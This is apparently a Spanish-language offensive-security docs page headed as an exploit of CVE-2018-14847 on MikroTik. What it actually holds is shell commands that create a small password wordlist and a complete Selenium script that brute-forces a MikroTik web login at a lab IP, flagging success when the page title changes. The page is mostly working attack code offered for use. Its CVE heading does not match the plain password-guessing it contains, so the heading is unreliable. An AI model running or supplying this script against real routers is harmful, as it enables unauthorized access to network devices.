---
theme: "just-the-docs"
title: "Autenticacion Mikrotik Selenium"
layout: default
nav_order: 15
parent: "Seguridad Ofensiva"
---
# Explotacion CVE-2018-14847
```bash
cd /home/lesand/Desktop/tools/selenium
echo -e "lesand2222\nlesand3333\nlesand1111\nlesand4321\nlesand1234\nlesand2020\nlesand2022\nlesand2023\nlesand2024\nlesand2025" > archivo.txt
nano selenium02.py
```
pegar el siguiente script
```python
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
import time

def login(url, password):
    options = Options()
    options.add_argument('--headless')
    options.add_argument('--disable-gpu')

    driver = webdriver.Remote('http://localhost:4444/wd/hub', options=options)
    
    try:
        driver.get(url)
        password_field = driver.find_element(By.ID, "password")
        password_field.send_keys(password)
        login_button = driver.find_element(By.XPATH, '//*[@id="login"]//a[@onclick="dologin()"]')
        login_button.click()
        time.sleep(2)
        return driver.title
    finally:
        driver.quit()

titulo_anterior = None

with open('archivo.txt', 'r') as archivo:
    for linea in archivo:
        contrasena = linea.strip()
        titulo_actual = login('http://192.168.85.134', contrasena)

        if titulo_anterior is None:
            titulo_anterior = titulo_actual
        else:
            if titulo_actual != titulo_anterior:
                print(f"Contraseña encontrada: {contrasena}")
                break
            else:
                print(f"Probando contraseña: {contrasena}")

            titulo_anterior = titulo_actual
```
